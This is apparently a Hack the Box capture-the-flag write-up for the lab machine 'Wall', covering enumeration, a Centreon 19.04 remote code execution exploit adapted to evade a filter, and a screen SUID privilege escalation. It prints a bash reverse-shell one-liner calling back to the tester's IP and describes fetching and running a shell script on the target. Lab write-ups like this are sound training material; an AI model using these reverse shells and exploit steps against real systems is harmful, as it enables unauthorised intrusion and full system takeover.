+++
author = "Nick"
categories = ["hack the box", "python", "burpsuite", "gobuster", "RCE", "reverse shell", "screen", "LPE"]
date = 2019-12-07T13:15:15Z
description = ""
draft = false
image = "__GHOST_URL__/content/images/2019/11/wall.png"
slug = "hack-the-box-wall"
summary = "Welcome to my write-up for the Hack the Box machine, Wall. This box is listed as an easy box, let's jump in!"
tags = ["hack the box", "python", "burpsuite", "gobuster", "RCE", "reverse shell", "screen", "LPE"]
title = "Hack the Box - Wall"

+++


Welcome to my write-up for the Hack the Box machine, Wall. This box is listed as a medium box, let's jump in!

As normal we start our enumeration process with ```nmap```. 

```nmap -sC -sV -oA initial_scan 10.10.10.157```

our results are pretty standard:

```
Nmap scan report for 10.10.10.157
Host is up (0.051s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2e:93:41:04:23:ed:30:50:8d:0d:58:23:de:7f:2c:15 (RSA)
|   256 4f:d5:d3:29:40:52:9e:62:58:36:11:06:72:85:1b:df (ECDSA)
|_  256 21:64:d0:c0:ff:1a:b4:29:0b:49:e1:11:81:b6:73:66 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.89 seconds
```

Let's head over to see what's being hosted. 

We see a standard ```apache2``` install. So we're going to want to enumerate this site a bit. We'll add it to our hostfile as wall.htb and send it into ```gobuster```.

We run:
```gobuster dir -u http://wall.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40```

We only get back two standard results

{{< figure src="__GHOST_URL__/content/images/2019/11/image-16.png" >}}

Since I didn't specify the ```-x``` parameter on the initial scan, we need to run it again for file extensions. We see there are a few with the .php extension.

{{< figure src="__GHOST_URL__/content/images/2019/11/image-17.png" >}}

There are some interesting files and folders after enumeration. There doesn't seem to be much we can do with the two new ```php``` files. When we open ```Burpsuit``` and start to poke the site with ```GET``` and ```POST``` requests, we see that if we send a ```POST``` request to ```/monitoring/``` we are redirected to ```/centreon```.

{{< figure src="__GHOST_URL__/content/images/2019/11/image-18.png" >}}

We go to the address and are greated with a login form. We see the version running is 19.04. A quick ```searchsploit``` on Centreon shows us that there is an RCE for this particular version.

{{< figure src="__GHOST_URL__/content/images/2019/11/image-19.png" >}}

We can copy this exploit to our current working directory with the ```-m``` command of ```searchsploit```.

```searchsploit centreon -m 47069```.

When we run the exploit we see our options:

{{< figure src="__GHOST_URL__/content/images/2019/11/image-20.png" >}}

In this case we'll need to obtain user credentials to run the exploit. Now you can brute force this login with a few options, ```hydra```, ```wfuzz``` or just write your own. In my case guessing the password without doing any of those worked out, turns out password1 isn't exactly hard to guess. Now that we have some credentials, we can use this exploit. 

So we give our exploit our credentials and our IP and port. Start a new NC listener and fire it off... Nothing. Hmmm, so We will modify the exploit to show us what might be going on. We modify the last bit of lines to show as this:

{{< figure src="__GHOST_URL__/content/images/2019/11/image-25.png" >}}

Now that we will get back some data on what might be going on, we run it again and see what's not working. We get back some XML data but it seems that it's working. There could be a WAF in place blocking the standard malicious payloads. So we'll again modify our script to simply take the payload we give it.

To do this we will change the amount of arguments our script takes. We will remove the line 30 & 31 for  ```ip``` and ```port```. We will then create an argument called ```payload```. We also need to modify the expected length on line 22. We should have something like this:

{{< figure src="__GHOST_URL__/content/images/2019/11/image-26.png" caption="" >}}

We then need to modify our ```payload_info```. Line 69 is where the payload the default exploit would use. However, we can simply replace this payload with the variable ```payload```. This way we can modify our payload on the go to evade whatever might be blocking the standard payload.

{{< figure src="__GHOST_URL__/content/images/2019/11/image-27.png" >}}

Our first goal will be to test it. We will execute our newly modified script to test that it works. We will start up a ```SimpleHTTPServer``` and host a file. We will then issue ```wget``` and see if the file is retrieved. In this case I made a quick file called shell.sh which has the standard bash remote connection:

```bash -i >& /dev/tcp/10.10.15.154/4444 0>&1```

We fire off our new exploit and we see it connect back to us and download the file.

{{< figure src="__GHOST_URL__/content/images/2019/11/image-28.png" >}}

Below we see that the exploit has indeed worked.

{{< figure src="__GHOST_URL__/content/images/2019/11/image-21.png" >}}

Next we have to move our file to the ```/tmp``` directory just to be sure it can run.  Then change the permissions of our script so it can execute.

{{< figure src="__GHOST_URL__/content/images/2019/11/image-22.png" >}}

We then fire up our listener and tell the script to execute. The first few times I tried this, I was unable to get a shell on random ports. So we just use the good ol' port 53 trick.

{{< figure src="__GHOST_URL__/content/images/2019/11/image-24.png" >}}

We get a shell back as ```www-data```! Now that we are on the machine, we can start enumerating. We download ```linenum``` and see what it comes back with. One item that is noticeable is ```screen-4.5.0``` in our SUID section.

{{< figure src="__GHOST_URL__/content/images/2019/11/image-29.png" >}}

A quick ```searchsploit``` for screen comes back with two possible Local Privilege Escalations.

{{< figure src="__GHOST_URL__/content/images/2019/11/image-30.png" >}}

We will download the exploit, host it on our server and get it from the target machine.

{{< figure src="__GHOST_URL__/content/images/2019/11/image-31.png" >}}

The exploit will error, however if we check the directory, we see our shell file ```rootshell```.  After that we run it and we have root shell:

{{< figure src="__GHOST_URL__/content/images/2019/11/image-33.png" >}}

We then grab the user flag. The box is done!

Hopefully something was learned. If you found this write-up helpful, consider sending some respect my way: [Lovecore's HTB Profile](https://www.hackthebox.eu/home/users/profile/95635).

